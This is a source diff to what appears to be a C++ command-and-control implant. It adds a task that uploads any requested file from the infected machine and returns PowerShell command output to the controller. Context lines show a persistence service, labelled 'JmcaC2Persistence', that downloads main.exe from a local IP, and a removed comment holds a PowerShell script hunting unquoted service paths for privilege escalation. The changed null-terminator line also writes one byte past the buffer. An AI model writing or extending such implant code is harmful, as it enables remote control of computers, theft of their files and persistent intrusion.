@@ -69,7 +69,8 @@ bool runTask(string outBuffer, DWORD dwSize)
 
     if (cmd == "powershell")
     {
-        runPSCommand(outBuffer.substr(pipePos + 1));
+        string res = runPSCommand(outBuffer.substr(pipePos + 1));
+        sendTaskResults(res);
     }
     else if (cmd == "enumservices")
     {
@@ -78,19 +79,6 @@ bool runTask(string outBuffer, DWORD dwSize)
 
         string res = runEncodedPSCommand(encodedCommand);
         sendTaskResults(res);
-
-        /*
-
-        $script='$VulnServices = gwmi win32_service | ?{$_} | where
-        {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where
-        {-not
-        $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0,
-        $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}; if
-        ($VulnServices) { foreach ($service in $VulnServices){ $out =
-        New-Object System.Collections.Specialized.OrderedDictionary;
-        $out.add("ServiceName", $service.name); $out.add("Path",
-        $service.pathname); $out } }';
-        [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))*/
     }
     else if (cmd == "screenshot")
     {
@@ -125,7 +113,11 @@ bool runTask(string outBuffer, DWORD dwSize)
         // (New-Object Net.WebClient).DownloadString(http://192.168.1.100:8080/main.exe)' -Description 'JmcaC2Persistence' -StartupType Automatic"
         // DELETE FOR TESTING : (Get-WmiObject -Class Win32_Service -Filter "Name='Persistence'").delete()
         string res = runEncodedPSCommand(encodedCommand);
-            sendTaskResults(res);
+        sendTaskResults(res);
+    }
+    else if (cmd == "file") {
+        string path = outBuffer.substr(pipePos + 1);
+        sendRequestedFile(path);
     }
 
     return true;
@@ -286,7 +278,7 @@ bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
         memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);
 
         *dwSizeOut += dwOut;
-        newBuf[*dwSizeOut - 1] = '\0';
+        newBuf[*dwSizeOut] = '\0';
         *outBuffer = newBuf;
         delete[] responseBuf;
     }
@@ -497,8 +489,6 @@ string runPSCommand(string command)
 
     int exitCode = _pclose(pPipe);
 
-    sendTaskResults(res);
-
     return res;
 
     // TODO: Make this process injection?
@@ -551,7 +541,6 @@ int main(int argc, const char **argv)
             if (dwSize > 0)
             {
                 runTask(outBuffer, dwSize);
-                printf("TASK: %.*s\n", dwSize, outBuffer);
                 delete[] outBuffer;
                 outBuffer = nullptr;
                 dwSize = 0;
